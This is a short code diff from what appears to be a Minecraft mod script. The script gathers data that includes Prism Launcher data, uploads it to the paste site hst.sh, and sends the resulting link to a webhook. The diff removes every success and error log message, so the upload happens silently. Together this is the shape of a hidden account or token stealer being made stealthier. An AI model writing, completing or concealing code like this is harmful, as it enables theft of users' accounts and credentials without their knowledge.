@@ -61,7 +61,6 @@ ${data.prism || 'No Prism Launcher data found'}
             let line;
             while ((line = reader.readLine()) !== null) response.append(line);
             reader.close();
-            
             const hastebinKey = JSON.parse(response.toString()).key;
             const rawLink = `https://hst.sh/raw/${hastebinKey}`;
             const webhookURL = new java.net.URL(link);
@@ -78,14 +77,10 @@ ${data.prism || 'No Prism Launcher data found'}
             outputStream.close();
 
             if (webhookConn.getResponseCode() === 200) {
-                Client.scheduleTask(() => console.log("Data uploaded successfully!"));
             } else {
-                Client.scheduleTask(() => console.error('Webhook error: HTTP ' + webhookConn.getResponseCode()));
             }
         } else {
-            Client.scheduleTask(() => console.error('hst.sh upload failed: HTTP ' + hastebinConn.getResponseCode()));
         }
     } catch (e) {
-        Client.scheduleTask(() => console.error('Error: ' + e.message));
     }
 }).start();
